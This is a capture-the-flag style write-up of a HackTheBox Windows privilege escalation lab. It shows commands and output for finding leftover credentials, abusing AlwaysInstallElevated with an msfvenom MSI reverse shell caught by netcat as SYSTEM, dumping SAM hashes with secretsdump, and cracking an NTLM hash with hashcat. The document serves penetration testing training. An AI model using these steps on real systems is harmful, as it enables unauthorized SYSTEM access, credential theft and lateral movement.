
As an add-on to their annual penetration test, the INLANEFREIGHT organization has asked you to perform a security review of their standard Windows 10 gold image build currently in use by over 1,200 of their employees worldwide. The new CISO is worried that best practices were not followed when establishing the image baseline, and there may be one or more local privilege escalation vectors present in the build. Above all, the CISO wants to protect the company's internal infrastructure by ensuring that an attacker who can gain access to a workstation (through a phishing attack, for example) would be unable to escalate privileges and use that access move laterally through the network. Due to regulatory requirements, INLANEFREIGHT employees do not have local administrator privileges on their workstations.

You have been granted a standard user account with RDP access to a clone of a standard user Windows 10 workstation with no internet access. The client wants as comprehensive an assessment as possible (they will likely hire your firm to test/attempt to bypass EDR controls in the future); therefore, Defender has been disabled. Due to regulatory controls, they cannot allow internet access to the host, so you will need to transfer any tools over yourself.

Enumerate the host fully and attempt to escalate privileges to administrator/SYSTEM level access.



**Q1.Find left behind cleartext credentials for the iamtheadministrator domain admin account.**

use the findstr to find the files containing specific strings.

```
findstr /si "iamtheadministrator" C:\*.txt C:\*.xml C:\*.ini C:\*.config

type C:\Windows\Panther\unattend.xml
```

**Q2.Escalate privileges to SYSTEM and submit the contents of the flag.txt file on the Administrator Desktop**

```

C:\Users\htb-student>reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
    
C:\Users\htb-student>  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer                                  
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

    
```

we can also use  WinPEAS, which  is widely used for system configuration audits. Running the binary or batch script will automatically highlight the status of the AlwaysInstallElevated keys along with other potential escalation vectors.

now we can create a payload using msfvenom

```
┌──(satoru㉿satoru)-[~/Desktop/HTB/CPTS/WinPE]
└─$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.15.187 lport=4444 -f msi > skill.msi

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of msi file: 159744 bytes


```

I  was having a error so i did some changes in standard command to see the error

```
PS C:\Users\htb-student> msiexec /i C:\Users\htb-student\skill.msi /qn /L*V C:\Users\htb-student\error.log     

```

```
┌──(satoru㉿satoru)-[~/Desktop/HTB/CPTS/WinPE]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.187] from (UNKNOWN) [10.129.43.33] 49677
Microsoft Windows [Version 10.0.18363.592]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

```

```
C:\Windows\system32>type c:\users\administrator\desktop\flag.txt
type c:\users\administrator\desktop\flag.txt

```

**Q3.There is 1 disabled local admin user on this system with a weak password that may be used to access other systems in the network and is worth reporting to the client. After escalating privileges retrieve the NTLM hash for this user and crack it offline. Submit the cleartext password for this account.

run these command in the system privileged shell

```
C:\Windows\system32>reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\sam C:\sam.save
The operation completed successfully.

C:\Windows\system32>reg.exe save hklm\system C:\system.save
reg.exe save hklm\system C:\system.save
The operation completed successfully.


```

copy and paste it using rdp session, we can copy files by right click copy and paste it into you attack machine.

dumped hashes using:

```
$ secretsdump.py -sam sam.save -system system.save LOCAL 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xfab4b2e32a415ea36f846b9408aa69af
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:aad797e20ba0675bbcb3e3df3319042c:::
mrb3n:1001:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
wksadmin:1003:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::
[*] Cleaning up... 

```


we can use net users username to find which user is inactive.

use the hashcat to crack the hash locally using wordlist

```
└─$ hashcat -m 1000 -a 0 wksadmin.hash /home/satoru/Desktop/HACKVISER/CAPT/rockyou.txt

hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 7 4800H with Radeon Graphics, 2204/4409 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (2415 MB free)

Dictionary cache hit:
* Filename..: /home/satoru/Desktop/HACKVISER/CAPT/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

5835048ce94ad0564e29a924a03510ef:password1                
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 5835048ce94ad0564e29a924a03510ef
Time.Started.....: Tue Jul 14 20:27:22 2026 (0 secs)
Time.Estimated...: Tue Jul 14 20:27:22 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/home/satoru/Desktop/HACKVISER/CAPT/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   785.8 kH/s (0.36ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096/14344384 (0.03%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> oooooo
Hardware.Mon.#01.: Util: 23%

Started: Tue Jul 14 20:27:16 2026
Stopped: Tue Jul 14 20:27:24 2026

```

password cracked.
